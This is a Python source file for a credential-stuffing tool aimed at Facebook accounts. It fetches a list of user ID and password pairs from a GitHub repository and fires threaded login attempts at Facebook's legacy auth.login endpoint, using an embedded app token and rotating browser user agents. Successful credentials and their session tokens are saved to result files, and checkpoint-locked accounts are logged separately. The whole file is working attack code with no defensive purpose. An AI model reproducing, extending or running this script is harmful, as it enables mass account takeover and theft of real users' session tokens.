import os, sys, time, requests, random, threading
from datetime import datetime

BASE_URL = "https://b-api.facebook.com/method/auth.login"
DATE_DIR = f"results/{datetime.now().strftime('%Y-%m-%d')}"
OK_PATH = f"{DATE_DIR}/OK.txt"
CP_PATH = f"{DATE_DIR}/CP.txt"
TOKEN_PATH = f"{DATE_DIR}/tokens.txt"

user_agents = [
    "Mozilla/5.0 (Linux; Android 11; V2050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0.5735.110 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36",
]

def save_result(uid, pwd, status, token=None):
    os.makedirs(DATE_DIR, exist_ok=True)
    if status == "OK":
        with open(OK_PATH, "a") as ok:
            ok.write(f"{uid}|{pwd}\n")
        if token:
            with open(TOKEN_PATH, "a") as t:
                t.write(f"{uid}|{token}\n")
    else:
        with open(CP_PATH, "a") as cp:
            cp.write(f"{uid}|{pwd}\n")

def login(uid, pwd):
    headers = {
        "User-Agent": random.choice(user_agents)
    }
    params = {
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "format": "json",
        "sdk_version": "2",
        "email": uid,
        "locale": "en_US",
        "password": pwd,
        "sdk": "android",
        "generate_session_cookies": "1",
        "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"
    }
    try:
        r = requests.get(BASE_URL, params=params, headers=headers).json()
        if "session_key" in r:
            token = r.get("access_token", "")
            print(f"\033[1;32m[OK] {uid} | {pwd}\033[0m")
            save_result(uid, pwd, "OK", token)
        elif "www.facebook.com" in r.get("error_msg", ""):
            print(f"\033[1;33m[CP] {uid} | {pwd}\033[0m")
            save_result(uid, pwd, "CP")
    except:
        pass

def combo_cloner():
    print("\n📡 Loading combo.txt from GitHub...")
    try:
        url = "https://raw.githubusercontent.com/Labbaik757/Labbaik-Tool/main/combo.txt"
        r = requests.get(url)
        r.raise_for_status()
        combos = r.text.strip().split("\n")
        print(f"🚀 Starting cloning on {len(combos)} accounts...\n")
        for combo in combos:
            if "|" in combo:
                uid, pwd = combo.split("|")
                threading.Thread(target=login, args=(uid, pwd)).start()
        print(f"\n✅ Results saved in {DATE_DIR}/OK.txt | CP.txt | tokens.txt")
    except Exception as e:
        print("❌ Failed to load combo.txt from GitHub:", e)

def uid_dumper_combo():
    print("❌ UID Dumper not available in GitHub-only mode.")
    print("👉 Use combo_cloner() to start cloning.")

if __name__ == "__main__":
    combo_cloner()
